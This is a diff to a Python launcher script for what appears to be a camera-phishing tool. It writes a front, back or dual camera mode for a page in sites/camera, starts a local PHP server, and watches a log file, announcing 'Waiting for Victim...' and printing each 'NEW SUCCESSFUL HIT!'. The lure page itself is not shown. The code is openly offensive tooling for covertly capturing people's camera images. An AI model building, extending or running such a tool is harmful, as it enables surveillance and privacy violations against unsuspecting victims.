@@ -23,23 +23,30 @@ def start():
     if choice == '2': mode = "back"
     elif choice == '3': mode = "dual"
 
-    # Ensure directory exists
-    if not os.path.exists("sites/camera"):
-        os.makedirs("sites/camera")
+    if not os.path.exists("sites/camera"): os.makedirs("sites/camera")
+    with open("sites/camera/mode.txt", "w") as f: f.write(mode)
     
-    # Save mode to text file for HTML access
-    with open("sites/camera/mode.txt", "w") as f:
-        f.write(mode)
+    if os.path.exists("sites/camera/logs.txt"): os.remove("sites/camera/logs.txt")
 
-    print(f"\n\033[1;32m[*] Server starting on Port 8080... Mode: {mode.upper()}\033[0m")
-    
-    # Start PHP local server
+    print(f"\n\033[1;32m[*] Server active on Port 8080 | Mode: {mode.upper()}\033[0m")
     subprocess.Popen("php -S 127.0.0.1:8080 -t sites/camera/", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    print("\033[1;33m[!] Waiting for photos... (Images saved in sites/camera/)\033[0m")
+    print("\033[1;33m[!] Waiting for Victim... (Ctrl+C to stop)\n\033[0m")
+    print("-" * 65)
+
+    last_line = 0
     while True:
-        time.sleep(2)
+        if os.path.exists("sites/camera/logs.txt"):
+            with open("sites/camera/logs.txt", "r") as f:
+                lines = f.readlines()
+                if len(lines) > last_line:
+                    for i in range(last_line, len(lines)):
+                        print(f"\033[1;32m[+] NEW SUCCESSFUL HIT!\033[0m")
+                        print(f"\033[1;37m{lines[i].strip()}\033[0m")
+                        print("-" * 65)
+                    last_line = len(lines)
+        time.sleep(1)
 
 if __name__ == "__main__":
     start()
-  
+    
